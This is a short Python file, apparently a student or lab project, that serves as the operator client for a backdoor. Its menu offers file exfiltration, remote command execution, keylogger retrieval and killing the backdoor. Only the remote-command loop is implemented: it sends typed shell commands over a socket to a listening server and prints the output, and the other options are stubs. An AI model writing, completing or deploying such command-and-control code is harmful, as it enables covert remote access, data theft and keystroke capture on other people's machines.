###########
#File: client.py
#Author: Shiv Bhatia
###########

import sys,os
from scapy.all import *
import socket

host="localhost"
port=8045

clientsocket=socket.socket(socket.AF_INET, socket.SOCK_STREAM) #create socket
clientsocket.connect((host,port)) #Run server first else you will receive connection refused error

def options():
    print ("Please select one of the following options: \n 1. Exfilterate file \n 2. Run backdoor commands \n 3. receive keylogger file \n 4. kill backdoor \n 5. kill client without killing backdoor")
    option=int(input("Please select one of the above options: "))
    choice(option)

def choice(option): #Processing the choice entered
    if option==1:exfil()
    elif option==2:bakdoor()
    elif option==3:keylog()
    elif option==4:kill_backdoor()
    elif option==5:kill_client()
    else : print("Please enter one of the above options")

def sendchoice(choices):
    print ("You chose: " + str(choices)) #debugging line

def exfil():
	print("In Exfil")#debugging line

def bakdoor():
	print("In backdoor")#debugging line
	send_receive()
	

def keylog():
    print("In Keylog")#debugging line
    

def kill_backdoor():
    print("Killing backdoor")#debugging line
    

def kill_client():
    print("Killing client")#debugging line

def send_receive():
	print("You are connected, start!")#debugging line
	BUFFER_SIZE=10000
	#start listening for reponse from server
	#If packet is from the server to the client, process it and print the output
	#Runs after sending a command to server
	while 1:
		var = input("\n>>")
		if var!="":
			clientsocket.sendall(var.strip().encode())
			if var == "cd .." or var == "cd" : print("Can not change directories but you can run commands like 'cd ..&&pwd'")
			else:
				data = clientsocket.recv(BUFFER_SIZE).strip()
				if data.decode()=="closing backdoor": #server has acknowledged receipt of exit command
					clientsocket.close()
					break
				sys.stdout.write(data.decode())
				sys.stdout.flush()
				#print (data)
		data =""
	options()
options()
clientsocket.close()
